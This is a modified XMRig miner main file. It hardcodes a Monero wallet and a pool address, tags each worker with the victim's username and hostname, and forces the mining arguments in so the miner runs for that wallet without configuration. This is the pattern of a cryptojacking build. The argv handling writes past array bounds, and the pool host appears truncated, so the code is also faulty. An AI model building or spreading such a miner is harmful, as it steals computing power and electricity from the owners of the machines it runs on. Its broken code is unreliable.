/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2017-2018 XMR-Stak    <https://github.com/fireice-uk>, <https://github.com/psychocrypt>
 * Copyright 2018-2019 SChernykh   <https://github.com/SChernykh>
 * Copyright 2016-2019 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <unistd.h>

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"

char* getusername () {
        struct passwd *pwd;
        pwd = getpwuid(getuid());
        return(pwd->pw_name);
}


int main(int argc, char **argv) {
    using namespace xmrig;

    char nowuser[256];
    sprintf(nowuser, "%s", getusername() );

    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    strcat(nowuser, "_" );
    strcat(nowuser, hostname );
    char wallet[] = "8ApoSg9UZqBG4pfdJ1ySyPUtJxyxYnJubLZifQxParW7Lgm4p7eNGBM4Lb6wZ1vym8Ndf7GbWFgQgc3QtEuBYGKASPWy1zH";
    char zzu[2048];
    sprintf(zzu, "--user=%s.%s", wallet, nowuser);
    argv[++argc] = (char*) "--url=xmr.f2pool:13531";
    argv[++argc] = (char*) zzu;
    argv[++argc] = (char*) "--pass=x";
    argv[++argc] = (char*) "--keepalive";

    Process process(argc, argv);
    const Entry::Id entry = Entry::get(process);
    if (entry) {
        return Entry::exec(process, entry);
    }

    App app(&process);

    return app.exec();
}
